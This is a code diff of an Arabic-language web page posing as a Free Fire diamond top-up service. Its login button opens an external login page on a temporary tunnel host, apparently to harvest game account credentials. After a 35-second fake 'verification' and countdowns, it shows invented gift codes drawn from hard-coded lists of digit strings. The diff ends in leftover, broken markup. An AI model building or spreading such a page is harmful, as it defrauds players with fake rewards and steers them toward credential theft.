@@ -3,17 +3,17 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🎉 كود فري فاير 510 جوهرة</title>
+<title>💎 موقع شحن فري فاير 2026</title>
 
 <style>
 body{
   margin:0;
-  font-family: 'Arial', sans-serif;
+  font-family: Arial, sans-serif;
   color:#fff;
   text-align:center;
-  background: linear-gradient(270deg,#0f2027,#203a43,#2c5364,#6a11cb,#2575fc);
-  background-size: 800% 800%;
-  animation: bg 18s ease infinite;
+  background: linear-gradient(270deg,#000000,#0f2027,#203a43,#6a11cb,#ff0000,#00eaff);
+  background-size: 1000% 1000%;
+  animation: bg 20s ease infinite;
 }
 
 @keyframes bg{
@@ -24,37 +24,48 @@ body{
 
 .top-bar{
   padding:15px;
-  font-size:28px;
+  font-size:30px;
   font-weight:bold;
-  text-shadow:0 0 15px #000;
+  text-shadow:0 0 20px #000;
+  animation: colorText 3s infinite;
+}
+
+@keyframes colorText{
+  0%{color:#ffd700;}
+  50%{color:#00eaff;}
+  100%{color:#ff0000;}
 }
 
 .logo{
-  width:90px;
+  width:100px;
   margin-top:10px;
+  filter: drop-shadow(0 0 15px #00eaff);
 }
 
 .container{
-  max-width:700px;
-  margin:30px auto;
+  max-width:750px;
+  margin:40px auto;
   padding:30px;
-  border-radius:25px;
-  background:rgba(0,0,0,0.7);
-  box-shadow:0 0 40px #00eaff;
+  border-radius:30px;
+  background:rgba(0,0,0,0.8);
+  box-shadow:0 0 60px #00eaff;
+  position:relative;
+}
+
+.game-logo{
+  position:absolute;
+  top:10px;
+  right:10px;
+  width:60px;
 }
 
 h1{
+  font-size:32px;
   color:#ffd700;
-  text-shadow:0 0 15px #000;
-}
-
-p{
-  font-size:18px;
-  line-height:1.6;
 }
 
 button{
-  padding:15px 30px;
+  padding:15px 35px;
   font-size:20px;
   border:none;
   border-radius:15px;
@@ -62,7 +73,7 @@ button{
   margin:15px;
   font-weight:bold;
   transition:0.3s;
-  box-shadow:0 0 25px #fff;
+  box-shadow:0 0 30px #fff;
 }
 
 #loginBtn{
@@ -72,6 +83,11 @@ button{
 
 #codeBtn{
   background:#00eaff;
+  color:#000;
+}
+
+#diamond110Btn{
+  background:#ffd700;
   color:#000;
 }
 
@@ -85,25 +101,140 @@ button:disabled{
 }
 
 #codeBox{
-  margin-top:20px;
+  margin-top:25px;
   font-size:26px;
   color:#00ffcc;
   font-weight:bold;
-  text-shadow:0 0 10px #000;
-}
-
-.small-logo{
-  width:70px;
-  margin-top:10px;
-}
-
-.footer{
-  margin-top:40px;
-  padding:20px;
-  background:rgba(0,0,0,0.5);
-  border-top:2px solid #00eaff;
 }
 </style>
+</head>
+<body>
+
+<div class="top-bar">
+🔥 موقع الشحن فري فاير 2026 🔥
+<br>
+<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
+</div>
+
+<div class="container">
+  <img class="game-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
+
+  <h1>💎 نظام شحن الجواهر الاحترافي</h1>
+  <p>قم بتسجيل الدخول أولاً ثم انتظر 35 ثانية لتفعيل الأكواد</p>
+
+  <button id="loginBtn">🔐 تسجيل دخول فري فاير</button>
+  <br>
+
+  <button id="codeBtn" disabled>🎁 الحصول على كود 510 جوهرة</button>
+  <button id="diamond110Btn" disabled>💎 الحصول على 110 جوهرة</button>
+
+  <div id="codeBox"></div>
+</div>
+
+<script>
+const loginBtn = document.getElementById("loginBtn");
+const codeBtn = document.getElementById("codeBtn");
+const diamond110Btn = document.getElementById("diamond110Btn");
+const codeBox = document.getElementById("codeBox");
+
+// أكواد 510
+const codes510 = [
+"386855252454554",
+"252524242524244",
+"252524242424222",
+"252522222241222",
+"252522212242222",
+"252525222255283",
+"683825382425544",
+"383865242427242"
+];
+
+// أكواد 110
+const codes110 = [
+"5865252524243",
+"343438252525",
+"373424242424",
+"273424242425",
+"37342425242",
+"37352525224",
+"27252554352",
+"37242552522",
+"35352424242",
+"352525253522"
+];
+
+let index510 = 0;
+let index110 = 0;
+let logged = false;
+
+// عند الضغط على تسجيل الدخول (الرابط الجديد)
+loginBtn.addEventListener("click", () => {
+  window.open("https://sword-grants-warnings-mixing.trycloudflare.com/login.html", "_blank");
+
+  logged = true;
+  codeBtn.disabled = true;
+  diamond110Btn.disabled = true;
+
+  codeBox.textContent = "⏳ جاري التحقق من تسجيل الدخول... انتظر 35 ثانية";
+
+  setTimeout(() => {
+    if(logged){
+      codeBtn.disabled = false;
+      diamond110Btn.disabled = false;
+      codeBox.textContent = "✅ تم التحقق بنجاح! يمكنك الآن الحصول على الأكواد";
+    }
+  }, 35000);
+});
+
+// عداد 20 ثانية
+function startCountdown(callback){
+  let seconds = 20;
+  codeBox.textContent = "⏳ يرجى الانتظار: " + seconds + " ثانية";
+
+  const timer = setInterval(() => {
+    seconds--;
+    codeBox.textContent = "⏳ تجهيز الكود: " + seconds + " ثانية";
+
+    if(seconds <= 0){
+      clearInterval(timer);
+      callback();
+    }
+  }, 1000);
+}
+
+// زر 510 جوهرة
+codeBtn.addEventListener("click", () => {
+  if(logged){
+    codeBtn.disabled = true;
+    diamond110Btn.disabled = true;
+
+    startCountdown(() => {
+      codeBox.textContent = "🎁 كود 510 جوهرة: " + codes510[index510] + " 💎";
+      index510 = (index510 + 1) % codes510.length;
+      codeBtn.disabled = false;
+      diamond110Btn.disabled = false;
+    });
+  }
+});
+
+// زر 110 جوهرة
+diamond110Btn.addEventListener("click", () => {
+  if(logged){
+    codeBtn.disabled = true;
+    diamond110Btn.disabled = true;
+
+    startCountdown(() => {
+      codeBox.textContent = "💎 كود 110 جوهرة: " + codes110[index110] + " 💎";
+      index110 = (index110 + 1) % codes110.length;
+      codeBtn.disabled = false;
+      diamond110Btn.disabled = false;
+    });
+  }
+});
+</script>
+
+</body>
+</html></style>
 </head>
 <body>
 
